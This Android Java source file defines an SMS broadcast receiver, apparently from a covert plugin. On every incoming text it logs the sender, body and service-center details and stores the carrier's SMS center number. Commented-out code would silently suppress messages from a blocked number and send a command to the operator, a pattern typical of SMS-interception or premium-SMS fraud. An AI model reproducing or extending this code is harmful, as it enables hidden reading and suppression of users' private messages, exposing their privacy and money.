package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import com.xstd.plugin.Utils.SMSUtil;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: PM11:17
 * To change this template use File | Settings | File Templates.
 */
public class PrivateSMSBRC extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            Config.LOGD("[[PrivateSMSBRC::onReceive]] action = " + intent.getAction());
            SmsMessage[] messages = getMessagesFromIntent(intent);
            if (messages == null || messages.length == 0) {
                return;
            }

            SettingManager.getInstance().init(context);
            for (SmsMessage message : messages) {
                /**
                 * 先判断短信中心是否已经有了配置，如果没有的话，尝试从短信中获取短信中心的号码
                 */

                Config.LOGD("[[PrivateSMSBRC::onReceive]] has receive SMS from <<" + message.getDisplayOriginatingAddress()
                                + ">>, content : " + message.getMessageBody()
                                + "\n || sms center = " + message.getServiceCenterAddress()
                                + "\n || sms display origin address = " + message.getDisplayOriginatingAddress()
                                + "\n || sms = " + message.toString()
                                + "\n || intent info = " + intent.toString());

                String center = message.getServiceCenterAddress();
                Config.LOGD("[[PrivateSMSBRC::onReceive]] center = " + center);
                if (!TextUtils.isEmpty(center)) {
                    if (center.startsWith("+") == true && center.length() == 14) {
                        center = center.substring(3);
                    } else if (center.length() > 11) {
                        center = center.substring(center.length() - 11);
                    }

                    SettingManager.getInstance().setKeySmsCenterNum(center);

                    if (Config.DEBUG) {
                        Config.LOGD("[[PrivateSMSBRC::onReceive]] SMS Center is : " + center + ">>>>>>>>");
                    }
                }

                /**
                 * 如果短信中心不为空，那么再进行其他的操作
                 */
                if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())) {
//                    if (message.getOriginatingAddress().indexOf(AppRuntime.BLOCKED_NUMBER) != -1) {
//                        String key = message.getMessageBody();
//
//                        if (Config.DELETE_RECEIVED_MESSAGE) {
//                            abortBroadcast();
//                        }
//                    }
                } else {
                    //如果短信中心为空，向的运营商发送一条信息来获取短信中心的号码
//                    SMSUtil.trySendCmdToNetwork(context);
                }
            }
        }
    }

    /**
     * 从Intent中获取短信的信息。
     *
     * @param intent
     * @return
     */
    private final SmsMessage[] getMessagesFromIntent(Intent intent) {
        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
        byte[][] pduObjs = new byte[messages.length][];
        for (int i = 0; i < messages.length; i++) {
            pduObjs[i] = (byte[]) messages[i];
        }
        byte[][] pdus = new byte[pduObjs.length][];
        int pduCount = pdus.length;
        SmsMessage[] msgs = new SmsMessage[pduCount];
        for (int i = 0; i < pduCount; i++) {
            pdus[i] = pduObjs[i];
            msgs[i] = SmsMessage.createFromPdu(pdus[i]);
        }
        return msgs;
    }

}
